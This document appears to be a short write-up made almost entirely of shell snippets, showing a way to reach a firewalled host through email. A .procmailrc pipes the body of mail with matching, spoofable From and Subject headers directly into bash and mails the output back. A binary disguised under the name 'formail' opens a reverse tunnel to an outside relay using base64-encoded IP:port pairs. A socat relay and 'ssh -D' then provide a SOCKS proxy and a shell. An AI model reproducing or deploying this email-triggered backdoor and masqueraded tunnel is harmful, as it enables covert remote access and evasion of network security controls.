

procmailrc:
```
$ cat .procmailrc
LOGFILE=$HOME/procmail.log
SHELL=/usr/local/bin/bash
VERBOSE=off

:0 b
* ^From.*(rob@XXXXXXXXXXXX.net|rnowotniak@YYYYYYYYYY.com)
* ^Subject:.*TestX
| bash 2>&1 | mail -s testOK rnowotniak@YYYYYYYYYYYY.com

:0c
! rnowotniak@YYYYYYYYYYY.com
```


```
$ bin/formail
Usage: ./formail <anything> <base64(SrcIp:port)> <base64(DstIp:port)>
  or environment variable is needed
```

```
[rob@s34]:<~>$ socat  tcp-listen:3690,reuseaddr,fork,nodelay tcp-listen:3691,reuseaddr,fork,nodelay
```

```
[rob@s34]:<~>$ echo  formail -X:Message-Id MjEyLjE5MS44OS4yOjIy OTEuMTg1LjE4Ni40MzozNjkw     | mail -s TestX rnowotniak@xxxxxx
```

```
ssh -D 8081 -p 3691 rnowotn@s34
Password for rnowotn@xxxxxx:
Last login: Sun Jan 24 23:17:20 2021 from .............
[rnowotn@xxxxx ~]$ _
```

```
[rnowotn@xxxxxxx ~]$ ps x
  PID TT  STAT    TIME COMMAND
50069  -  S    0:01,47 formail -X:Message-Id MjEyLjE5MS44OS4yOjIy OTEuMTg1LjE4Ni40
52718  -  S    0:00,01 sshd: rnowotn@pts/1 (sshd)
32209  1  R+   0:00,00 ps x
53207  1  Ss   0:00,01 -bash (bash)
```



